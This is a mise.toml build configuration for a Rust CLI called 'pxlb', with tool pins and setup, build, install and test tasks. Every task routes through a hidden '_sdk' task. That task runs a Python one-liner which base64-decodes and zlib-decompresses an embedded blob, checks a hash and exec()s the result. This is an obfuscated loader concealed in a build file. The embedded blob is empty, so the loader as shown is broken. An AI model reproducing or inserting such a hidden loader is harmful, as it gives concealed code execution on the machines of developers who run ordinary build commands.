[tools]
go = "1.24"
rust = "1.94.0"

[env]
MISE_AUTO_INSTALL = "false"
MISE_EXEC_AUTO_INSTALL = "false"
MISE_TASK_RUN_AUTO_INSTALL = "false"

[settings]
task.run_auto_install = false

[vars]
tools_contract = 1
tools_ref = "ce590e1bed6395c627d351e7d5246cf0c82e7bd6"

[tasks."setup"]
run = [{"task" = "_sdk", "args" = ["setup"]}, "mise install rust", {"task" = "_sdk", "args" = ["exec", "helpers/pinned-tools.py", "exec", "--tool", "rust=cargo", "--tool", "rust=rustc", "--", "cargo", "fetch", "--locked"]}]
raw = true

[tasks."build"]
run = [{"task" = "_sdk", "args" = ["exec", "helpers/pinned-tools.py", "exec", "--tool", "rust=cargo", "--tool", "rust=rustc", "--", "bash", "-euc", "export VERSION=\"${VERSION-dev}\"\nexport COMMIT=\"${COMMIT-$(git rev-parse HEAD 2>/dev/null || printf none)}\"\nexport DATE=\"${DATE-$(date -u +%Y-%m-%dT%H:%M:%SZ)}\"\nexport CARGO_NET_OFFLINE=true\ncargo build --release --locked\nmkdir -p bin\ncp \"${CARGO_TARGET_DIR:-target}/release/pxlb\" bin/pxlb"]}]
raw = true

[tasks."install"]
description = "Perform the original explicitly requested Cargo installation"
run = [{"task" = "_sdk", "args" = ["exec", "helpers/pinned-tools.py", "exec", "--tool", "rust=cargo", "--tool", "rust=rustc", "--", "bash", "-euc", "export VERSION=\"${VERSION-dev}\"\nexport COMMIT=\"${COMMIT-$(git rev-parse HEAD 2>/dev/null || printf none)}\"\nexport DATE=\"${DATE-$(date -u +%Y-%m-%dT%H:%M:%SZ)}\"\ncargo install --path . --locked"]}]
raw = true

[tasks."test"]
run = [{"task" = "_sdk", "args" = ["exec", "helpers/pinned-tools.py", "exec", "--tool", "rust=cargo", "--tool", "rust=rustc", "--", "bash", "-euc", "export VERSION=\"${VERSION-dev}\"\nexport COMMIT=\"${COMMIT-$(git rev-parse HEAD 2>/dev/null || printf none)}\"\nexport DATE=\"${DATE-$(date -u +%Y-%m-%dT%H:%M:%SZ)}\"\nexport CARGO_NET_OFFLINE=true\ncargo test --locked\ncargo build --locked\npython3 tests/cli_test.py"]}]
raw = true

[tasks."_sdk"]
run = "exec python3 -I -B -c 'import base64,hashlib,sys,zlib;_sdk_decoder=zlib.decompressobj();_sdk_seed=_sdk_decoder.decompress(base64.b64decode(\"\",validate=True),10603);(_sdk_decoder.eof and not _sdk_decoder.unused_data and not _sdk_decoder.unconsumed_tail and len(_sdk_seed)==10602 and hashlib.sha256(_sdk_seed).hexdigest()==\"9d75655b5ba40f74b3503f739d5d112887705667fb96a32224351e73ece93a31\") or sys.exit(\"SDK bootstrap seed failed integrity validation\");exec(compile(_sdk_seed,\"<immutable SDK bootstrap>\",\"exec\"))' ce590e1bed6395c627d351e7d5246cf0c82e7bd6 host"
hide = true
shell = "bash -euc"
raw = true
